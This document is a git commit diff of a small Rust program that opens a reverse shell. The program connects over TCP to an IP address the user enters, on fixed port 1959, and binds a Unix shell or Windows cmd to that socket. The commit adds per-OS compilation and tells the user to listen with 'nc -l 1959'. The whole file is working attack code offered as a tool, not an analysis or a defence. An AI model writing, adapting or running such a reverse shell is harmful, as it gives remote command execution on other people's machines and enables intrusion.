20bbbd21777528cde929c31a37a3b8309954fb03
gr@ng3r <grng3r@morty>
2021-06-14 14:09:01 +0100

    build for win and liux

--- src/main.rs
+++ src/main.rs
@@ -1,12 +1,18 @@
+#[cfg(target_os = "linux")]
 use std::{
-    io::{Read, Write},
     net::TcpStream,
     os::unix::io::{AsRawFd, FromRawFd},
     process::{Command, Stdio},
-    env,
 };
 
+#[cfg(target_os = "windows")]
+use std::{
+    io::{Read, Write},
+    net::TcpStream,
+    process::{Command, Stdio},
+};
 
+#[cfg(target_os = "linux")]
 fn unix_rev_shell(ip: &str, port:u16){
     let sock = TcpStream::connect((ip, port)).unwrap();
     let file_d = sock.as_raw_fd();
@@ -17,7 +23,7 @@ fn unix_rev_shell(ip: &str, port:u16){
         .spawn().unwrap().wait().unwrap();
 }
 
-
+#[cfg(target_os = "windows")]
 fn win_rev_shell(ip: &str, port:u16){
     let mut sock = TcpStream::connect((ip, port)).unwrap();
     let proc = Command::new("cmd")
@@ -27,7 +33,7 @@ fn win_rev_shell(ip: &str, port:u16){
         .spawn().unwrap();
 
     let mut buff = vec![];
-    sock.read(&mut buff);
+    sock.read(&mut buff).unwrap();
 
     match proc.stdin.unwrap().write_all(&buff){
         Err(e) => panic!("[ERR] writing to stdin: {}", e.to_string()),
@@ -41,12 +47,14 @@ fn win_rev_shell(ip: &str, port:u16){
 }
 
 fn main() {
-    let ip = "0.0.0.0";
+    //let ip = "0.0.0.0";
+    println!("If you want to test the program localy enter 0.0.0.0\nThe port you should be listening on is always 1959\nThe command to listen for the connection should be: 'nc -l 1959'\nEnter IP of the listening machine:");
+    let mut ip = String::new();
+    std::io::stdin().read_line(&mut ip).unwrap();
     let port: u16 = 1959;
-    let os = env::consts::OS;
-    match os{
-        "linux" => unix_rev_shell(ip, port),
-        "windows" => win_rev_shell(ip, port),
-        _ => panic!("[ERR] OS not implemented yet")
-    }
+    #[cfg(target_os = "windows")]
+    win_rev_shell(&*ip, port);//ip is explicitely reborrowed
+    #[cfg(target_os = "linux")]
+    unix_rev_shell(&*ip,port);
+
 }
